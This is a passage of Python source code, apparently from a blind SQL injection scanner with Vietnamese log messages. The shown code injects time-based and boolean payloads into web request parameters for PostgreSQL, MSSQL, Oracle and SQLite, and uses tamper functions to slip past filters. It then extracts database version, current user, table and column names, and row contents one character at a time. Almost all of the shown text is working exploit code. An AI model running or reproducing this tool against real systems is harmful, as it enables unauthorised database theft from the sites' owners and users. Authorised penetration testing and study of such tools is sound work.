            cond = f"ASCII(SUBSTR(({sql_expr}),{pos},1)) > {mid}"
            ok, _, _ = time_check_pgsql(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                lo = mid + 1
            else:
                hi = mid
        return lo
    except Exception as e:
        _log(f"time_get_char_ord_pgsql error: {str(e)}", "ERROR")
        return None

def time_get_string_pgsql(session, url, base_params, param_name, sql_expr, http_method='GET', tamper_func=tamper_none, maxlen=MAX_EXTRACT_LEN):
    try:
        length = time_get_len_pgsql(session, url, base_params, param_name, sql_expr, http_method, tamper_func, maxlen)
        if length is None or length == 0:
            return ""
        out_chars = []
        _log(f"Extracting string (length={length})...", "PROGRESS")
        for pos in range(1, length + 1):
            ord_val = time_get_char_ord_pgsql(session, url, base_params, param_name, sql_expr, pos, http_method, tamper_func)
            if ord_val is None:
                out_chars.append('?')
            else:
                out_chars.append(chr(ord_val))
            if pos % 10 == 0:
                _log(f"Progress: {pos}/{length}", "PROGRESS")
            time.sleep(SLEEP_BETWEEN)
        result = "".join(out_chars)
        _log(f"Extracted: {result}", "DONE")
        return result
    except Exception as e:
        _log(f"time_get_string_pgsql error: {str(e)}", "ERROR")
        return ""

def time_enumerate_tables_pgsql(session, url, base_params, param_name, http_method='GET', tamper_func=tamper_none, max_tables=MAX_TABLES):
    try:
        _log("Enumerating tables (time-based, PostgreSQL)...", "START")
        tables = []
        for i in range(max_tables):
            expr = f"(SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET {i})"
            name = time_get_string_pgsql(session, url, base_params, param_name, expr, http_method, tamper_func)
            if not name:
                break
            _log(f"Table[{i}] = {name}", "TABLE")
            tables.append(name)
        _log(f"Total tables: {len(tables)}", "SUCCESS")
        return tables
    except Exception as e:
        _log(f"time_enumerate_tables_pgsql error: {str(e)}", "ERROR")
        return []

def time_enumerate_columns_pgsql(session, url, base_params, param_name, table_name, http_method='GET', tamper_func=tamper_none, max_cols=MAX_COLUMNS):
    try:
        _log(f"Enumerating columns for table {table_name}", "INFO")
        cols = []
        safe_table = table_name.replace("'", "''")
        for i in range(max_cols):
            expr = f"(SELECT column_name FROM information_schema.columns WHERE table_name = '{safe_table}' AND table_schema = 'public' ORDER BY ordinal_position LIMIT 1 OFFSET {i})"
            name = time_get_string_pgsql(session, url, base_params, param_name, expr, http_method, tamper_func)
            if not name:
                break
            _log(f"Column[{i}] = {name}", "COLUMN")
            cols.append(name)
        return cols
    except Exception as e:
        _log(f"time_enumerate_columns_pgsql error: {str(e)}", "ERROR")
        return []

def time_extract_rows_pgsql(session, url, base_params, param_name, table_name, columns, http_method='GET', tamper_func=tamper_none, limit=MAX_ROW, pk_cols=None):
    try:
        _log(f"Extracting rows for table {table_name} (limit {limit})", "INFO")
        rows = []
        order_by = get_order_by_clause("PostgreSQL", table_name, pk_cols, columns)
        safe_table = table_name.replace("'", "''")
        for row_idx in range(limit):
            _log(f"Extracting row {row_idx + 1}/{limit}...", "PROGRESS")
            row_dict = {}
            has_data = False
            for col in columns:
                safe_col = col.replace("'", "''")
                expr = f"(SELECT {safe_col} FROM {safe_table} {order_by} LIMIT 1 OFFSET {row_idx})"
                cell_value = time_get_string_pgsql(session, url, base_params, param_name, expr, http_method, tamper_func, maxlen=80)
                row_dict[col] = cell_value if cell_value else ""
                if cell_value:
                    has_data = True
                _log(f"Cell ({col}): {cell_value}", "ROW")
            if has_data:
                rows.append(row_dict)
                _log(f"Row {row_idx + 1}: {row_dict}", "ROW")
            else:
                break
        return rows
    except Exception as e:
        _log(f"time_extract_rows_pgsql error: {str(e)}", "ERROR")
        return []

# ================== MSSQL TIME-BASED ==================
def time_check_mssql(session, url, base_params, param_name, condition_sql, http_method='GET', tamper_func=tamper_none):
    try:
        payload = tamper_func(f"' ; IF ({condition_sql}) WAITFOR DELAY '0:0:{MSSQL_DELAY}' --")
        params = base_params.copy()
        params[param_name] = payload
        text, elapsed, _ = make_request(session, url, params, http_method)
        ok = elapsed > TIME_THRESHOLD if elapsed is not None else False
        return ok, elapsed, text
    except Exception as e:
        _log(f"time_check_mssql error: {str(e)}", "ERROR")
        return False, None, None

def time_get_len_mssql(session, url, base_params, param_name, sql_expr, http_method='GET', tamper_func=tamper_none, max_guess=MAX_EXTRACT_LEN):
    try:
        lower = 0
        upper = 1
        while upper <= max_guess:
            cond = f"LEN(({sql_expr})) <= {upper}"
            ok, _, _ = time_check_mssql(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                break
            upper *= 2
        if upper > max_guess:
            return None
        while lower < upper:
            mid = (lower + upper) // 2
            cond = f"LEN(({sql_expr})) <= {mid}"
            ok, _, _ = time_check_mssql(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                upper = mid
            else:
                lower = mid + 1
        return lower
    except Exception as e:
        _log(f"time_get_len_mssql error: {str(e)}", "ERROR")
        return None

def time_get_char_ord_mssql(session, url, base_params, param_name, sql_expr, pos, http_method='GET', tamper_func=tamper_none, low=ASCII_MIN, high=ASCII_MAX):
    try:
        lo = low
        hi = high
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTRING(({sql_expr}),{pos},1)) > {mid}"
            ok, _, _ = time_check_mssql(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                lo = mid + 1
            else:
                hi = mid
        return lo
    except Exception as e:
        _log(f"time_get_char_ord_mssql error: {str(e)}", "ERROR")
        return None

def time_get_string_mssql(session, url, base_params, param_name, sql_expr, http_method='GET', tamper_func=tamper_none, maxlen=MAX_EXTRACT_LEN):
    try:
        length = time_get_len_mssql(session, url, base_params, param_name, sql_expr, http_method, tamper_func, maxlen)
        if length is None or length == 0:
            return ""
        out_chars = []
        _log(f"Extracting string (length={length})...", "PROGRESS")
        for pos in range(1, length + 1):
            ord_val = time_get_char_ord_mssql(session, url, base_params, param_name, sql_expr, pos, http_method, tamper_func)
            if ord_val is None:
                out_chars.append('?')
            else:
                out_chars.append(chr(ord_val))
            if pos % 10 == 0:
                _log(f"Progress: {pos}/{length}", "PROGRESS")
            time.sleep(SLEEP_BETWEEN)
        result = "".join(out_chars)
        _log(f"Extracted: {result}", "DONE")
        return result
    except Exception as e:
        _log(f"time_get_string_mssql error: {str(e)}", "ERROR")
        return ""

def time_enumerate_tables_mssql(session, url, base_params, param_name, http_method='GET', tamper_func=tamper_none, max_tables=MAX_TABLES):
    try:
        _log("Enumerating tables (time-based, MSSQL)...", "START")
        tables = []
        for i in range(max_tables):
            expr = f"(SELECT name FROM sys.tables ORDER BY name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)"
            name = time_get_string_mssql(session, url, base_params, param_name, expr, http_method, tamper_func)
            if not name:
                break
            _log(f"Table[{i}] = {name}", "TABLE")
            tables.append(name)
        _log(f"Total tables: {len(tables)}", "SUCCESS")
        return tables
    except Exception as e:
        _log(f"time_enumerate_tables_mssql error: {str(e)}", "ERROR")
        return []

def time_enumerate_columns_mssql(session, url, base_params, param_name, table_name, http_method='GET', tamper_func=tamper_none, max_cols=MAX_COLUMNS):
    try:
        _log(f"Enumerating columns for table {table_name}", "INFO")
        cols = []
        safe_table = table_name.replace("'", "''")
        for i in range(max_cols):
            expr = f"(SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('{safe_table}') ORDER BY column_id OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)"
            name = time_get_string_mssql(session, url, base_params, param_name, expr, http_method, tamper_func)
            if not name:
                break
            _log(f"Column[{i}] = {name}", "COLUMN")
            cols.append(name)
        return cols
    except Exception as e:
        _log(f"time_enumerate_columns_mssql error: {str(e)}", "ERROR")
        return []

def time_extract_rows_mssql(session, url, base_params, param_name, table_name, columns, http_method='GET', tamper_func=tamper_none, limit=MAX_ROW, pk_cols=None):
    try:
        _log(f"Extracting rows for table {table_name} (limit {limit})", "INFO")
        rows = []
        order_by = get_order_by_clause("MSSQL", table_name, pk_cols, columns)
        safe_table = table_name.replace("'", "''")
        for row_idx in range(limit):
            _log(f"Extracting row {row_idx + 1}/{limit}...", "PROGRESS")
            row_dict = {}
            has_data = False
            for col in columns:
                safe_col = col.replace("'", "''")
                expr = f"(SELECT {safe_col} FROM {safe_table} {order_by} OFFSET {row_idx} ROWS FETCH NEXT 1 ROWS ONLY)"
                cell_value = time_get_string_mssql(session, url, base_params, param_name, expr, http_method, tamper_func, maxlen=80)
                row_dict[col] = cell_value if cell_value else ""
                if cell_value:
                    has_data = True
                _log(f"Cell ({col}): {cell_value}", "ROW")
            if has_data:
                rows.append(row_dict)
                _log(f"Row {row_idx + 1}: {row_dict}", "ROW")
            else:
                break
        return rows
    except Exception as e:
        _log(f"time_extract_rows_mssql error: {str(e)}", "ERROR")
        return []

# ================== ORACLE TIME-BASED ==================
def time_check_oracle(session, url, base_params, param_name, condition_sql, http_method='GET', tamper_func=tamper_none):
    try:
        payload = tamper_func(f"' AND CASE WHEN ({condition_sql}) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{ORACLE_DELAY}) ELSE 0 END > 0 --")
        params = base_params.copy()
        params[param_name] = payload
        text, elapsed, _ = make_request(session, url, params, http_method)
        ok = elapsed > TIME_THRESHOLD if elapsed is not None else False
        return ok, elapsed, text
    except Exception as e:
        _log(f"time_check_oracle error: {str(e)}", "ERROR")
        return False, None, None

def time_get_len_oracle(session, url, base_params, param_name, sql_expr, http_method='GET', tamper_func=tamper_none, max_guess=MAX_EXTRACT_LEN):
    try:
        lower = 0
        upper = 1
        while upper <= max_guess:
            cond = f"LENGTH(({sql_expr})) <= {upper}"
            ok, _, _ = time_check_oracle(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                break
            upper *= 2
        if upper > max_guess:
            return None
        while lower < upper:
            mid = (lower + upper) // 2
            cond = f"LENGTH(({sql_expr})) <= {mid}"
            ok, _, _ = time_check_oracle(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                upper = mid
            else:
                lower = mid + 1
        return lower
    except Exception as e:
        _log(f"time_get_len_oracle error: {str(e)}", "ERROR")
        return None

def time_get_char_ord_oracle(session, url, base_params, param_name, sql_expr, pos, http_method='GET', tamper_func=tamper_none, low=ASCII_MIN, high=ASCII_MAX):
    try:
        lo = low
        hi = high
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTR(({sql_expr}),{pos},1)) > {mid}"
            ok, _, _ = time_check_oracle(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                lo = mid + 1
            else:
                hi = mid
        return lo
    except Exception as e:
        _log(f"time_get_char_ord_oracle error: {str(e)}", "ERROR")
        return None

def time_get_string_oracle(session, url, base_params, param_name, sql_expr, http_method='GET', tamper_func=tamper_none, maxlen=MAX_EXTRACT_LEN):
    try:
        length = time_get_len_oracle(session, url, base_params, param_name, sql_expr, http_method, tamper_func, maxlen)
        if length is None or length == 0:
            return ""
        out_chars = []
        _log(f"Extracting string (length={length})...", "PROGRESS")
        for pos in range(1, length + 1):
            ord_val = time_get_char_ord_oracle(session, url, base_params, param_name, sql_expr, pos, http_method, tamper_func)
            if ord_val is None:
                out_chars.append('?')
            else:
                out_chars.append(chr(ord_val))
            if pos % 10 == 0:
                _log(f"Progress: {pos}/{length}", "PROGRESS")
            time.sleep(SLEEP_BETWEEN)
        result = "".join(out_chars)
        _log(f"Extracted: {result}", "DONE")
        return result
    except Exception as e:
        _log(f"time_get_string_oracle error: {str(e)}", "ERROR")
        return ""

def time_enumerate_tables_oracle(session, url, base_params, param_name, http_method='GET', tamper_func=tamper_none, max_tables=MAX_TABLES):
    try:
        _log("Enumerating tables (time-based, Oracle)...", "START")
        tables = []
        for i in range(max_tables):
            expr = f"(SELECT table_name FROM (SELECT table_name, ROWNUM AS rn FROM all_tables WHERE owner = USER) WHERE rn = {i+1})"
            name = time_get_string_oracle(session, url, base_params, param_name, expr, http_method, tamper_func)
            if not name:
                break
            _log(f"Table[{i}] = {name}", "TABLE")
            tables.append(name)
        _log(f"Total tables: {len(tables)}", "SUCCESS")
        return tables
    except Exception as e:
        _log(f"time_enumerate_tables_oracle error: {str(e)}", "ERROR")
        return []

def time_enumerate_columns_oracle(session, url, base_params, param_name, table_name, http_method='GET', tamper_func=tamper_none, max_cols=MAX_COLUMNS):
    try:
        _log(f"Enumerating columns for table {table_name}", "INFO")
        cols = []
        safe_table = table_name.upper().replace("'", "''")
        for i in range(max_cols):
            expr = f"(SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM all_tab_columns WHERE table_name = '{safe_table}' AND owner = USER ORDER BY column_id) WHERE rn = {i+1})"
            name = time_get_string_oracle(session, url, base_params, param_name, expr, http_method, tamper_func)
            if not name:
                break
            _log(f"Column[{i}] = {name}", "COLUMN")
            cols.append(name)
        return cols
    except Exception as e:
        _log(f"time_enumerate_columns_oracle error: {str(e)}", "ERROR")
        return []

def time_extract_rows_oracle(session, url, base_params, param_name, table_name, columns, http_method='GET', tamper_func=tamper_none, limit=MAX_ROW, pk_cols=None):
    try:
        _log(f"Extracting rows for table {table_name} (limit {limit})", "INFO")
        rows = []
        order_by = get_order_by_clause("Oracle", table_name, pk_cols, columns)
        safe_table = table_name.upper().replace("'", "''")
        for row_idx in range(limit):
            _log(f"Extracting row {row_idx + 1}/{limit}...", "PROGRESS")
            row_dict = {}
            has_data = False
            for col in columns:
                safe_col = col.upper().replace("'", "''")
                expr = f"(SELECT {safe_col} FROM (SELECT {safe_col}, ROWNUM AS rn FROM {safe_table} {order_by}) WHERE rn = {row_idx+1})"
                cell_value = time_get_string_oracle(session, url, base_params, param_name, expr, http_method, tamper_func, maxlen=80)
                row_dict[col] = cell_value if cell_value else ""
                if cell_value:
                    has_data = True
                _log(f"Cell ({col}): {cell_value}", "ROW")
            if has_data:
                rows.append(row_dict)
                _log(f"Row {row_idx + 1}: {row_dict}", "ROW")
            else:
                break
        return rows
    except Exception as e:
        _log(f"time_extract_rows_oracle error: {str(e)}", "ERROR")
        return []

# ================== SQLITE TIME-BASED ==================
def time_check_sqlite(session, url, base_params, param_name, condition_sql, http_method='GET', tamper_func=tamper_none):
    try:
        payload = tamper_func(f"')) AND CASE WHEN ({condition_sql}) THEN RANDOMBLOB(20000000) ELSE 0 END --")
        params = base_params.copy()
        params[param_name] = payload
        text, elapsed, _ = make_request(session, url, params, http_method)
        ok = elapsed > TIME_THRESHOLD if elapsed is not None else False
        return ok, elapsed, text
    except Exception as e:
        _log(f"time_check_sqlite error: {str(e)}", "ERROR")
        return False, None, None

def time_get_len_sqlite(session, url, base_params, param_name, sql_expr, http_method='GET', tamper_func=tamper_none, max_guess=MAX_EXTRACT_LEN):
    try:
        lower = 0
        upper = 1
        while upper <= max_guess:
            cond = f"LENGTH(({sql_expr})) <= {upper}"
            ok, _, _ = time_check_sqlite(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                break
            upper *= 2
        if upper > max_guess:
            return None
        while lower < upper:
            mid = (lower + upper) // 2
            cond = f"LENGTH(({sql_expr})) <= {mid}"
            ok, _, _ = time_check_sqlite(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                upper = mid
            else:
                lower = mid + 1
        return lower
    except Exception as e:
        _log(f"time_get_len_sqlite error: {str(e)}", "ERROR")
        return None

def time_get_char_ord_sqlite(session, url, base_params, param_name, sql_expr, pos, http_method='GET', tamper_func=tamper_none, low=ASCII_MIN, high=ASCII_MAX):
    try:
        lo = low
        hi = high
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"UNICODE(SUBSTR(({sql_expr}),{pos},1)) > {mid}"
            ok, _, _ = time_check_sqlite(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                lo = mid + 1
            else:
                hi = mid
        return lo
    except Exception as e:
        _log(f"time_get_char_ord_sqlite error: {str(e)}", "ERROR")
        return None

def time_get_string_sqlite(session, url, base_params, param_name, sql_expr, http_method='GET', tamper_func=tamper_none, maxlen=MAX_EXTRACT_LEN):
    try:
        length = time_get_len_sqlite(session, url, base_params, param_name, sql_expr, http_method, tamper_func, maxlen)
        if length is None or length == 0:
            return ""
        out_chars = []
        _log(f"Extracting string (length={length})...", "PROGRESS")
        for pos in range(1, length + 1):
            ord_val = time_get_char_ord_sqlite(session, url, base_params, param_name, sql_expr, pos, http_method, tamper_func)
            if ord_val is None:
                out_chars.append('?')
            else:
                out_chars.append(chr(ord_val))
            if pos % 10 == 0:
                _log(f"Progress: {pos}/{length}", "PROGRESS")
            time.sleep(SLEEP_BETWEEN)
        result = "".join(out_chars)
        _log(f"Extracted: {result}", "DONE")
        return result
    except Exception as e:
        _log(f"time_get_string_sqlite error: {str(e)}", "ERROR")
        return ""

def time_enumerate_tables_sqlite(session, url, base_params, param_name, http_method='GET', tamper_func=tamper_none, max_tables=MAX_TABLES):
    try:
        _log("Enumerating tables (time-based, SQLite)...", "START")
        tables = []
        for i in range(max_tables):
            expr = f"(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i})"
            name = time_get_string_sqlite(session, url, base_params, param_name, expr, http_method, tamper_func)
            if not name:
                break
            _log(f"Table[{i}] = {name}", "TABLE")
            tables.append(name)
        _log(f"Total tables: {len(tables)}", "SUCCESS")
        return tables
    except Exception as e:
        _log(f"time_enumerate_tables_sqlite error: {str(e)}", "ERROR")
        return []

def time_enumerate_columns_sqlite(session, url, base_params, param_name, table_name, http_method='GET', tamper_func=tamper_none, max_cols=MAX_COLUMNS):
    try:
        _log(f"Enumerating columns for table {table_name}", "INFO")
        cols = []
        safe_table = table_name.replace("'", "''")
        for i in range(max_cols):
            expr = f"(SELECT name FROM PRAGMA_table_info('{safe_table}') ORDER BY cid LIMIT 1 OFFSET {i})"
            name = time_get_string_sqlite(session, url, base_params, param_name, expr, http_method, tamper_func)
            if not name:
                break
            _log(f"Column[{i}] = {name}", "COLUMN")
            cols.append(name)
        return cols
    except Exception as e:
        _log(f"time_enumerate_columns_sqlite error: {str(e)}", "ERROR")
        return []

def time_extract_rows_sqlite(session, url, base_params, param_name, table_name, columns, http_method='GET', tamper_func=tamper_none, limit=MAX_ROW, pk_cols=None):
    try:
        _log(f"Extracting rows for table {table_name} (limit {limit})", "INFO")
        rows = []
        order_by = get_order_by_clause("SQLite", table_name, pk_cols, columns)
        safe_table = table_name.replace("'", "''")
        for row_idx in range(limit):
            _log(f"Extracting row {row_idx + 1}/{limit}...", "PROGRESS")
            row_dict = {}
            has_data = False
            for col in columns:
                safe_col = col.replace("'", "''")
                expr = f"(SELECT {safe_col} FROM {safe_table} {order_by} LIMIT 1 OFFSET {row_idx})"
                cell_value = time_get_string_sqlite(session, url, base_params, param_name, expr, http_method, tamper_func, maxlen=80)
                row_dict[col] = cell_value if cell_value else ""
                if cell_value:
                    has_data = True
                _log(f"Cell ({col}): {cell_value}", "ROW")
            if has_data:
                rows.append(row_dict)
                _log(f"Row {row_idx + 1}: {row_dict}", "ROW")
            else:
                break
        return rows
    except Exception as e:
        _log(f"time_extract_rows_sqlite error: {str(e)}", "ERROR")
        return []

# ================== SCANNING FUNCTIONS ==================
def test_boolean_injection(session, url, base_params, param_name, http_method='GET', verbose=False):
    results = []
    seen = set()
    for payload_true, payload_false, desc in BOOLEAN_PAYLOADS:
        for tamper_name, tamper_func in TAMPER_FUNCTIONS.items():
            pt = tamper_func(payload_true)
            pf = tamper_func(payload_false)
            key = f"{desc}*{tamper_name}"
            if key in seen: continue
            seen.add(key)
            params_true = base_params.copy()
            params_true[param_name] = pt
            params_false = base_params.copy()
            params_false[param_name] = pf
            true_hashes = []
            false_hashes = []
            true_texts = []
            false_texts = []
            for retry in range(RETRIES):
                text_t, _, _ = make_request(session, url, params_true, http_method)
                if text_t:
                    sha_true = hash_text(text_t)
                    true_hashes.append(sha_true)
                    true_texts.append(text_t)
                time.sleep(SLEEP_BETWEEN)
                text_f, _, _ = make_request(session, url, params_false, http_method)
                if text_f:
                    sha_false = hash_text(text_f)
                    false_hashes.append(sha_false)
                    false_texts.append(text_f)
                time.sleep(SLEEP_BETWEEN)
            if true_hashes and false_hashes:
                most_common_true = Counter(true_hashes).most_common(1)[0][0]
                most_common_false = Counter(false_hashes).most_common(1)[0][0]
                if most_common_true != most_common_false:
                    db_hints = []
                    for text in true_texts + false_texts:
                        db_hints.extend(detect_database_from_content(text))
                    db_names = list(dict.fromkeys([db for db, _ in db_hints]))
                    result = {
                        "type": "boolean",
                        "payload_desc": desc,
                        "tamper": tamper_name,
                        "true_sha": most_common_true,
                        "false_sha": most_common_false,
                        "db_hints": db_names,
                        "confidence": "CAO" if len(true_hashes) == RETRIES else "TRUNG BÌNH"
                    }
                    results.append(result)
                    if verbose:
                        _log(f"Phát hiện: {desc} | tamper={tamper_name} | SHA true={most_common_true} | SHA false={most_common_false} | DBs={db_names}", "SUCCESS")
    return results

def test_time_based_injection(session, url, base_params, param_name, http_method='GET', verbose=False):
    results = []
    seen = set()
    for payload_info in TIME_BASED_PAYLOADS:
        payload_true = payload_info["true"]
        payload_false = payload_info["false"]
        db_type = payload_info["db"]
        expected_delay = payload_info["delay"]
        for tamper_name, tamper_func in TAMPER_FUNCTIONS.items():
            pt = tamper_func(payload_true.format(d=expected_delay) if "{d}" in payload_true else payload_true)
            pf = tamper_func(payload_false.format(d=0) if "{d}" in payload_false else payload_false)
            key = f"{db_type}*{tamper_name}"
            if key in seen: continue
            seen.add(key)
            params_true = base_params.copy()
            params_true[param_name] = pt
            params_false = base_params.copy()
            params_false[param_name] = pf
            true_times = []
            false_times = []
            true_texts = []
            false_texts = []
            for retry in range(RETRIES):
                text_t, elapsed_t, _ = make_request(session, url, params_true, http_method)
                if elapsed_t is not None:
                    true_times.append(elapsed_t)
                    if text_t:
                        true_texts.append(text_t)
                time.sleep(SLEEP_BETWEEN)
                text_f, elapsed_f, _ = make_request(session, url, params_false, http_method)
                if elapsed_f is not None:
                    false_times.append(elapsed_f)
                    if text_f:
                        false_texts.append(text_f)
                time.sleep(SLEEP_BETWEEN)
            avg_true = safe_mean(true_times)
            avg_false = safe_mean(false_times)
            if avg_true is not None and avg_false is not None:
                time_diff = avg_true - avg_false
                min_delay = expected_delay * 0.7 if db_type == "SQLite" else expected_delay - 1
                if time_diff >= TIME_THRESHOLD and avg_true >= min_delay:
                    db_hints = [db_type]
                    for text in true_texts + false_texts:
                        detected = detect_database_from_content(text)
                        db_hints.extend([db for db, _ in detected])
                    db_names = list(dict.fromkeys(db_hints))
                    result = {
                        "type": "time_based",
                        "db_template": db_type,
                        "tamper": tamper_name,
                        "avg_true": round(avg_true, 2),
                        "avg_false": round(avg_false, 2),
                        "time_diff": round(time_diff, 2),
                        "expected_delay": expected_delay,
                        "db_hints": db_names,
                        "confidence": "CAO" if len(true_times) == RETRIES else "TRUNG BÌNH"
                    }
                    results.append(result)
                    if verbose:
                        _log(f"Phát hiện: {db_type} | tamper={tamper_name} | avg_true={avg_true:.2f}s | avg_false={avg_false:.2f}s | diff={time_diff:.2f}s | DBs={db_names}", "SUCCESS")
    return results

def calibrate_true_sha(db, session, url, base_params, param_name, http_method, tamper_func):
    try:
        if db == "SQLite":
            return calibrate_true_sha_sqlite(session, url, base_params, param_name, http_method, tamper_func)
        if db == "MySQL":
            test_payload = tamper_func("1' AND 1=1 -- -")
        elif db == "PostgreSQL":
            test_payload = tamper_func("' AND 1=1 --")
        elif db == "MSSQL":
            test_payload = tamper_func("' AND 1=1 --")
        elif db == "Oracle":
            test_payload = tamper_func("' AND 1=1 --")
        else:
            return None
        return _most_common_hash_from_payload(session, url, base_params, param_name, test_payload, http_method)
    except Exception as e:
        _log(f"calibrate_true_sha error for {db}: {str(e)}", "ERROR")
        return None

def run_scan(target_url, default_params, request_method='POST', cookies=None, headers=None, do_dump=False, log_func=None):
    if log_func is None:
        def log_func(_s):
            return None
    set_log_func(log_func)
    session = requests.Session()
    if headers:
        session.headers.update(headers)
    else:
        session.headers.update({"User-Agent": "enhanced-blind-scanner/2.0"})
    if cookies:
        session.cookies.update(cookies)
    method = request_method.upper()
    results = []
    _log("Công cụ Quét Blind SQL Injection - EXTENDED VERSION", "HEADER")
    _log("Hỗ trợ MySQL, PostgreSQL, MSSQL, Oracle, SQLite với Boolean & Time-based", "INFO")
    _log(f"Mục tiêu: {target_url}", "INFO")
    _log(f"Tham số: {default_params}", "INFO")
    _log(f"Phương thức: {method}", "INFO")
    _log(f"Timeout: {REQUEST_TIMEOUT}s", "INFO")
    _log(f"Retries: {RETRIES}", "INFO")
    _log(f"DO_DUMP: {do_dump}", "INFO")
    for param_name in default_params.keys():
        if param_name == 'Submit':
            continue
        try:
            _log(f"Quét tham số: {param_name} ({method})", "INFO")
            _log("Thiết lập baseline...", "PROGRESS")
            baseline_text, baseline_time, baseline_status = make_request(session, target_url, default_params, method)
            baseline_hash = hash_text(baseline_text)
            baseline_db = detect_database_from_content(baseline_text) if baseline_text else []
            db_hints = [db for db, _ in baseline_db]
            _log(f"Baseline: trạng thái={baseline_status} thời gian={baseline_time:.2f}s hash={baseline_hash}", "DEBUG")
            if db_hints:
                _log(f"Gợi ý DB baseline: {db_hints}", "DEBUG")
            _log("Kiểm tra boolean-based injection...", "PROGRESS")
            boolean_results = test_boolean_injection(session, target_url, default_params, param_name, method, verbose=True)
            _log("Kiểm tra time-based injection...", "PROGRESS")
            time_results = test_time_based_injection(session, target_url, default_params, param_name, method, verbose=True)
            res = {
                "param": param_name,
                "method": method,
                "baseline": {
                    "hash": baseline_hash,
                    "time": baseline_time,
                    "status": baseline_status,
                    "db_hints": db_hints
                },
                "boolean": boolean_results,
                "time_based": time_results,
                "dump": {}
            }
            results.append(res)
            if do_dump:
                _log("PHASE 1: DATA EXTRACTION", "START")
                all_detected_dbs = set()
                for b in boolean_results:
                    all_detected_dbs.update(b["db_hints"])
                for t in time_results:
                    all_detected_dbs.update(t["db_hints"])
                if all_detected_dbs:
                    for db in all_detected_dbs:
                        best_bool = next((r for r in boolean_results if db in r["db_hints"]), None)
                        best_time = next((r for r in time_results if db in r["db_hints"]), None)
                        is_time_based = False
                        true_sha = None
                        tamper_func = None
                        if best_bool:
                            true_sha = best_bool["true_sha"]
                            tamper_func = TAMPER_FUNCTIONS[best_bool["tamper"]]
                            _log(f"Sử dụng Boolean-based cho {db}", "INFO")
                        elif best_time:
                            is_time_based = True
                            tamper_func = TAMPER_FUNCTIONS[best_time["tamper"]]
                            _log(f"Sử dụng Time-based cho {db}", "INFO")
                        if tamper_func:
                            if not is_time_based and not true_sha:
                                true_sha = calibrate_true_sha(db, session, target_url, default_params, param_name, method, tamper_func)
                            version = get_db_version(db, session, target_url, default_params, param_name, true_sha, method, tamper_func, is_time_based)
                            curr_db = get_current_database(db, session, target_url, default_params, param_name, true_sha, method, tamper_func, is_time_based)
                            curr_user = get_current_user(db, session, target_url, default_params, param_name, true_sha, method, tamper_func, is_time_based)
                            dump_data = {}
                            if version:
                                dump_data["version"] = version
                                _log(f"DB Version ({db}): {version}", "SUCCESS")
                            if curr_db:
                                dump_data["current_db"] = curr_db
                                _log(f"Current DB ({db}): {curr_db}", "SUCCESS")
                            if curr_user:
                                dump_data["current_user"] = curr_user
                                _log(f"Current User ({db}): {curr_user}", "SUCCESS")
                            if is_time_based:
                                tables = enumerate_tables_time_based(db, session, target_url, default_params, param_name, method, tamper_func)
                            else:
                                tables = enumerate_tables_boolean_based(db, session, target_url, default_params, param_name, true_sha, method, tamper_func)
                            if tables:
                                dump_data["tables"] = {}
                                _log(f"Tables ({db}): {tables}", "TABLE")
                                for table in tables:
                                    pk_cols = detect_primary_key(db, table, session, target_url, default_params, param_name, true_sha, method, tamper_func, is_time_based)
                                    if pk_cols:
                                        _log(f"PK for {table}: {pk_cols}", "DEBUG")
                                    if is_time_based:
                                        columns = enumerate_columns_time_based(db, session, target_url, default_params, param_name, table, method, tamper_func)
                                    else:
                                        columns = enumerate_columns_boolean_based(db, session, target_url, default_params, param_name, table, true_sha, method, tamper_func)
                                    if columns:
                                        _log(f"Columns for {table}: {columns}", "COLUMN")
                                        if is_time_based:
                                            rows = extract_rows_time_based(db, session, target_url, default_params, param_name, table, columns, method, tamper_func, limit=MAX_ROW, pk_cols=pk_cols)
                                        else:
                                            rows = extract_rows_boolean_based(db, session, target_url, default_params, param_name, table, columns, true_sha, method, tamper_func, limit=MAX_ROW, pk_cols=pk_cols)
                                        dump_data["tables"][table] = {"columns": columns, "rows": rows}
                                        if rows:
                                            _log(f"Rows for {table}: {rows}", "ROW")
                            res["dump"][db] = dump_data
                _log("PHASE 1 COMPLETE", "DONE")
        except Exception as e:
            _log(f"Scan error for {param_name}: {str(e)}", "ERROR")
            res["error"] = str(e)
    _log("TÓM TẮT KẾT QUẢ QUÉT", "SUMMARY")
    for res in results:
        if "error" in res:
            continue
        param = res["param"]
        method = res["method"]
        bool_count = len(res["boolean"])
        time_count = len(res["time_based"])
        if bool_count > 0 or time_count > 0:
            _log(f"[DỄ BỊ TẤN CÔNG] Tham số {method}: {param}", "WARN")
            if bool_count > 0:
                _log(f" - Boolean-based: {bool_count} phát hiện", "INFO")
            if time_count > 0:
                _log(f" - Time-based: {time_count} phát hiện", "INFO")
            all_dbs = set()
            for b in res["boolean"]:
                all_dbs.update(b["db_hints"])
            for t in res["time_based"]:
                all_dbs.update(t["db_hints"])
            if all_dbs:
                _log(f" - Database phát hiện: {', '.join(all_dbs)}", "DEBUG")
            if time_count > 0:
                best_time = max(res["time_based"], key=lambda x: x["time_diff"]) if res["time_based"] else None
                if best_time:
                    _log(" Time-based tốt nhất:", "INFO")
                    _log(f" DB: {best_time['db_template']}", "DEBUG")
                    _log(f" Tamper: {best_time['tamper']}", "DEBUG")
                    _log(f" Time diff: {best_time['time_diff']}s", "DEBUG")
